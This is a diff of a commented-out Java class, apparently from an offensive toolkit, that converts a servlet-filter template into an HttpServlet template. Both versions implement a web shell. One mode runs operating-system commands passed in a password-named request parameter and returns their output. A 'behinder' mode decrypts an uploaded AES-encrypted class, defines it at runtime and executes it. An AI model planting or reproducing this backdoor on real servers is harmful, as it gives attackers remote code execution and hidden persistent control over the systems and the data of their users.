@@ -3,74 +3,70 @@
 //import sun.misc.BASE64Decoder;
 //import javax.crypto.Cipher;
 //import javax.crypto.spec.SecretKeySpec;
-//import javax.servlet.*;
+//import javax.servlet.ServletRequest;
+//import javax.servlet.ServletResponse;
+//import javax.servlet.http.HttpServlet;
 //import javax.servlet.http.HttpServletRequest;
+//import javax.servlet.http.HttpServletResponse;
 //import java.io.IOException;
 //import java.lang.reflect.InvocationTargetException;
 //import java.lang.reflect.Method;
 //import java.util.Scanner;
 //import java.util.UUID;
 //
-//public class DynamicFilterTemplate implements Filter {
+//public class DynamicServletTemplate extends HttpServlet {
 //
 //    private String password;
 //    private Class myClassLoaderClazz;
 //
-//    public DynamicFilterTemplate(){
+//    public DynamicServletTemplate(){
 //        super();
 //        this.password = "pass";
 //        initialize();
 //    }
 //
-//    public DynamicFilterTemplate(String password){
+//    public DynamicServletTemplate(String password){
 //        super();
 //        this.password = password;
 //        initialize();
 //    }
 //
 //    @Override
-//    public void init(FilterConfig filterConfig) throws ServletException {
-//
+//    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
+//        doGet(request, response);
 //    }
 //
 //    @Override
-//    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-//        System.out.println("[+] Dynamic Filter says hello");
+//    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+//        System.out.println("[+] Dynamic Servlet says hello");
 //
-//        String type = servletRequest.getParameter("type");
+//        String type = request.getParameter("type");
 //        if(type != null && type.equals("basic")){
-//            String cmd = servletRequest.getParameter(password);
+//            String cmd = request.getParameter(password);
 //            if(cmd != null && !cmd.isEmpty()){
 //                String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
-//                servletResponse.getWriter().println(result);
+//                response.getWriter().println(result);
 //            }
 //        }else if(type != null && type.equals("behinder")){
 //            try{
-//                if(servletRequest.getParameter(password) != null){
+//                if(request.getParameter(password) != null){
 //                    String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
-//                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", key);
-//                    servletResponse.getWriter().print(key);
+//                    request.getSession().setAttribute("u", key);
+//                    response.getWriter().print(key);
 //                    return;
 //                }
 //
 //                Cipher cipher = Cipher.getInstance("AES");
-//                cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
-//                byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
+//                cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
+//                byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
 //                Class evilClass = (Class) myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke(null, evilClassBytes, Thread.currentThread().getContextClassLoader());
 //                Object evilObject = evilClass.newInstance();
 //                Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
-//                targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
+//                targetMethod.invoke(evilObject, new Object[]{request, response});
 //            }catch(Exception e){
 //                e.printStackTrace();
 //            }
-//        }else{
-//            filterChain.doFilter(servletRequest, servletResponse);
 //        }
-//    }
-//
-//    @Override
-//    public void destroy() {
-//
 //    }
 //
 //    private void initialize(){
